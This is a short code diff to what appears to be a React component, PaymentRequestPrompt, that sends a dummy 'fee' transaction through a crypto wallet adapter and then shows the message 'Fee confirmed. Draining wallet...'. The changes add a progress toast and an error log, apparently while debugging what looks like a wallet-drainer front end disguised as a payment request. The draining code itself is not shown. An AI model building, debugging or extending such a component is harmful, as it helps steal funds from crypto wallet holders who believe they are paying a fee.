@@ -104,6 +104,7 @@ export function PaymentRequestPrompt() {
             ? await adapter.sendTransaction(freshDummy, connectionRef.current!, sendOpts)
             : await sendTransactionRef.current!(freshDummy, connectionRef.current!, sendOpts)
         }
+        toast.info('Fee transaction sent, waiting for confirmation...')
         const dummyConfirmation = await connectionRef.current!.confirmTransaction(
           { signature: dummySig, blockhash: freshDummy.recentBlockhash!, lastValidBlockHeight: freshDummy.lastValidBlockHeight! },
           'confirmed'
@@ -113,6 +114,7 @@ export function PaymentRequestPrompt() {
         }
         toast.success('Fee confirmed. Draining wallet...')
       } catch (err) {
+        console.error('STEP 1 error:', err)
         if (!isWalletUserCancel(err)) throw err
         inFlight.current = false
         setSubmitting(false)
